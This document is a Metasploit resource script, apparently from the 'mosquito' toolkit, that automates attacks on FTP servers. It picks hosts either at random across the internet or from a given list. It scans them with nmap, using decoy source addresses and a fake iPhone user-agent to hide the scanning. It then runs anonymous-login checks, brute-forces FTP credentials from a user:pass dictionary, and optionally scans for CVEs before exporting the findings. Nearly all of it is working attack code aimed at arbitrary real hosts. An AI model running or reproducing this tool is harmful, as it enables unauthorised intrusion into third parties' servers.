##
# Script: ftp_brute.rc
# Author: r00t-3xp10it <pedroubuntu10[at]gmail.com>
# GitHub: https://github.com/r00t-3xp10it/resource_files
# -
# [OPTIONS]
# setg SAVE_DB true - Save workspace mosquito to database.xml
# setg LIMMIT 1000 - Limmit the number of random WAN hosts to search
# setg RANDOM_HOSTS true - To instruct db_nmap to random search in WAN for hosts with ports open
# setg RHOSTS 143.191.125.117 183.17.237.229 162.246.22.133 - To instruct db_nmap to scan hosts for ports open.
# setg USERPASS_FILE /root/my_dicionary.txt - To instruct auxiliarys to use our own dicionary file
# -
# [SYNTAX EXAMPLES]
# msf5 > setg RANDOM_HOSTS true;resource /root/ftp_brute.rc'
# msfconsole -q -x 'setg RANDOM_HOSTS true;resource /root/ftp_brute.rc'
##
  <ruby>
      run_single("workspace -a mosquito")
      help = %Q|
                                                ðŸ¦Ÿ__________       
              _______ðŸ¦Ÿ________________________  ___(_) _  /______ðŸ¦Ÿ
           __  __  __ \\  __ \\_  ___/  __  /  / / /_  /_  __/  __ \\
         ðŸ¦Ÿ_  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
           /_/ /_/ /_/\\____//____/ \\__, / \\__,_/ /_/  \\__/ \\____/
                                  ðŸ¦Ÿ /_/                       ðŸ¦Ÿ

    Script: ftp_brute.rc
    Author: r00t-3xp10it <pedroubuntu10[at]gmail.com>
    GitHub: https://github.com/r00t-3xp10it/resource_files

      |
      print_line(help)
      Rex::sleep(1.5)

      ## Make sure we are connected to db
      unless framework.db.active
        File.delete("ip_range.txt") if File.exist?("ip_range.txt")
        print_error("[ERROR] Database not connected to postgresql.")
        print_warning("[execute] service postgresql start")
        run_single("exit")
        return nil
      else
        print_good("Database connected to postgresql.")
        Rex::sleep(0.5)
        local = Dir.pwd
        work_name = framework.db.workspace.name
        print_status("Working in workspace: *#{work_name}")
        Rex::sleep(1.0)
        ip_range = File.read("ip_range.txt") if File.exist?("ip_range.txt")
      end

      ## Sellect the type of nmap scan to use
      if (framework.datastore['RANDOM_HOSTS'] == "true")
         if (framework.datastore['LIMMIT'] == nil or framework.datastore['LIMMIT'] == '')
           run_single("setg LIMMIT 300")
           print_line("RHOSTS => Random Search in WAN for:#{framework.datastore['LIMMIT']} alive hosts")
         else
           print_line("LIMMIT => #{framework.datastore['LIMMIT']}")
           print_line("RHOSTS => Random Search in WAN for:#{framework.datastore['LIMMIT']} alive hosts")
         end
      elsif (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
         run_single("setg RHOSTS #{ip_range}.0/24")
      elsif (framework.datastore['RHOSTS'])
         print_line("RHOSTS => #{framework.datastore['RHOSTS']}")
      end

      ## Metasploit auxiliarys brute force dicionary absoluct path
      if (framework.datastore['USERPASS_FILE'] == nil or framework.datastore['USERPASS_FILE'] == '')
         run_single("setg USERPASS_FILE #{local}/bin/wordlists/ftp-default-userpasslist.txt")
      else
         print_line("USERPASS_FILE => #{framework.datastore['USERPASS_FILE']}")
      end

      ## db_nmap WAN or RHOSTS or LOCAL_LAN scan settings ftp-brute.nse
      # HINT: nmap will use a fake user-agent string (iPhone:Safari) while scanning.
      if (framework.datastore['RHOSTS'] == "#{ip_range}.0/24")
         run_single("db_nmap -sS -v -Pn -n -T4 -O -p 21 --open --script=banner.nse,http-headers.nse,ftp-anon.nse,ftp-vuln-cve2010-4221.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" #{framework.datastore['RHOSTS']}")
      elsif (framework.datastore['RANDOM_HOSTS'] == "true")
         print_status("Nmap: search for random remote hosts with ports 21 open")
         run_single("db_nmap -sS -vvv -Pn -n -T4 -iR #{framework.datastore['LIMMIT']} -p 21 --open --script=banner.nse,http-headers.nse,ftp-anon.nse,ftp-vuln-cve2010-4221.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3")
      else
         run_single("db_nmap -sS -v -Pn -n -T4 -O -p 21 --open --script=banner.nse,http-headers.nse,ftp-anon.nse,ftp-vuln-cve2010-4221.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3 #{framework.datastore['RHOSTS']}")
      end

      ## Read the database
      if File.directory?("#{local}/logs")
         run_single("spool #{local}/logs/ftp_brute.log")
      end
      print_line("")
      run_single("services")
      print_good("Sellecting target hosts from msf database.")
      xhost = framework.db.hosts.map(&:address).join(' ')
      xport = framework.db.services.map(&:port).join(' ')
      proto = framework.db.services.map(&:proto).join(' ')
      xname = framework.db.hosts.map(&:os_name).join(' ').gsub(' ',', ')
      run_single("setg RHOSTS #{xhost}")
      Rex::sleep(2.0)

         ## Make sure that exists hosts/ports (open) in database
         if xhost.nil? or xhost == '' or xhost == ' '
              File.delete("ip_range.txt") if File.exist?("ip_range.txt")
              print_error("[ERROR] db_nmap scan did not find any alive connections.")
              print_error("please wait, cleaning recent configurations.")
              Rex::sleep(1.0)
              run_single("unsetg all")
              run_single("workspace -d mosquito")
              return nil
         elsif xport.nil? or xport == '' or xport == ' '
              File.delete("ip_range.txt") if File.exist?("ip_range.txt")
              print_error("[ERROR] db_nmap did not find any 21 (ftp) open ports.")
              print_error("please wait, cleaning recent configurations.")
              Rex::sleep(1.0)
              run_single("unsetg all")
              run_single("workspace -d mosquito")
              return nil
         end

         ## Make sure that dicionary file exist (user:pass)
         check_word = "#{framework.datastore['USERPASS_FILE']}"
         unless (File.exist?(check_word))
              print_error("[ERROR] Dicionary absoluct path not found.")
              print_error("USERPASS_FILE => #{framework.datastore['USERPASS_FILE']}")
              Rex::sleep(1.0)
           word = %Q|

    [execute] setg USERPASS_FILE <absoluct-path-to-dicionary.txt>
    [example] setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
    'Remmenber that worldlist must be in user:pass format (one-per-line)'

           |
           print_line(word)
           print_error("Please wait, cleaning recent configurations.")
           Rex::sleep(1.0)
            run_single("unsetg all")
            run_single("workspace -d mosquito")
            File.delete("ip_range.txt") if File.exist?("ip_range.txt")
            return nil
         end

      ## Make sure that freevulnseach.nse exists
      Rex::sleep(2.0)
      nse = "/usr/share/nmap/scripts/freevulnsearch.nse"
      unless (File.exist?(nse))
           print_error("[ERROR] freevulnsearch.nse/vulners.nse script(s) not found in nmap db.")
           print_error("[ERROR] Download nse script(s) and install it before running this rc file.")
           Rex::sleep(1.0)
           nof = %Q|

    How To Fix
    ----------
    Exit current session and msfconsole < exit AND exit -y >
    Then execute the follow commands in a new terminal windows:

    sudo wget https://raw.githubusercontent.com/OCSAF/freevulnsearch/master/freevulnsearch.nse
    sudo cp freevulnsearch.nse /usr/share/nmap/scripts/freevulnsearch.nse
    sudo nmap --script-updatedb

    sudo wget https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse
    sudo cp vulners.nse /usr/share/nmap/scripts/vulners.nse
    sudo nmap --script-updatedb

           |
           print_line(nof)
           print_error("Please wait, cleaning recent configurations.")
           Rex::sleep(1.0)
           run_single("unsetg all")
           run_single("workspace -d mosquito")
           File.delete("ip_range.txt") if File.exist?("ip_range.txt")
           return nil
      else
           print_good("freevulnsearch.nse/vulners.nse script(s) found.")
      end

         ## Run gather/brute-force modules
         if xport =~ /21/ or proto =~ /ftp/i
              print_warning("Remote Target port: 21 ftp found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/ftp/ftp_version")
              print_line("")
              run_single("services -c name -S ftp -R")
              run_single("exploit")
              run_single("use auxiliary/scanner/ftp/anonymous")
              print_line("")
              run_single("services -c name -S ftp -R")
              run_single("set THREADS 35")
              run_single("exploit")
              run_single("use auxiliary/scanner/ftp/ftp_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BRUTEFORCE_SPEED 4")
              run_single("set THREADS 80")
              print_line("")
              run_single("services -c name -S ftp -R")
              run_single("exploit")
         end

         ## Running freevulnsearch.nse (scan for CVE's)
         print "[?] Scan for possible CVE's? (y/n): "
            question = gets.chomp

         if question == "y" or question == "Y"
            displ = %Q|

         MMMMMMMMMMM'""""'YMMM  MM""MMMMM""MM  MM""""""""`MMMMMMMMMM
         MMMMMMMMMM' .mmm. `MM  MM  MMMMM  MM  MM  mmmmmmmMMMMMMMMMM
         MMMMMMMMMM  MMMMMooMM  MM  MMMMP  MM  MM`      MMMMMMMMMMMM 
         MMMMMMMMMM  MMMMMMMMM  MM  MMMM' .MM  MM  MMMMMMMMMMMMMMMMM 
         MMMMMMMMMM. `MMM' .MM  MM  MMP' .MMM  MM  MMMMMMMMMMMMMMMMM 
         MMMMMMMMMMM.     .dMM  MM     .dMMMM  MM        .MMMMMMd@bM 
         MMMMMMMMMMMMMMMMMMMMM  MMMMMMMMMMMMM  MMMMMMMMMMMMMMMMMMMMM
                    freevulnsearch.nse by: Mathias Gut
                         vulners.nse by: gmedian

            |
            print_line(displ)
            print_warning("Running CVE checks againts: #{framework.datastore['RHOSTS']}")
            run_single("db_nmap -sV -T4 -Pn --script=freevulnsearch.nse,vulners.nse #{framework.datastore['RHOSTS']}")
         end

      ## Save current database to local file (database.xml)
      if (framework.datastore['SAVE_DB'] == "true")
         rand = Rex::Text.rand_text_alpha(5)
         print_warning("Exporting database to: #{local}/logs/database_#{rand}.xml")
         run_single("db_export -f xml -a #{local}/logs/database_#{rand}.xml")
      end

      print_line("")
      ## Display active sessions
      run_single("sessions -l")
      print_line("")
      ## Cleaning database and unset global variables
      print_warning("Cleaning global variables.")
      Rex::sleep(1.5)
      run_single("unsetg all")
      run_single("unset all")
      run_single("workspace -d mosquito")

      ## Writting ['xhost(s)'] to mosquito logfile
      if File.directory?("#{local}/logs")
         dtr = `date`
         print_status("Logfile stored under: #{local}/logs/ftp_brute.log")
         run_single("echo \"[#{dtr}] ftp_force: #{xhost}\" >> logs/mosquito.log")
         ## Store vulns log if exists open sessions
         if (framework.sessions.length > 0)
            run_single("vulns -o #{local}/logs/ftp_brute.csv")
         end
      end

      File.delete("ip_range.txt") if File.exist?("ip_range.txt")
      run_single("back")
   </ruby>
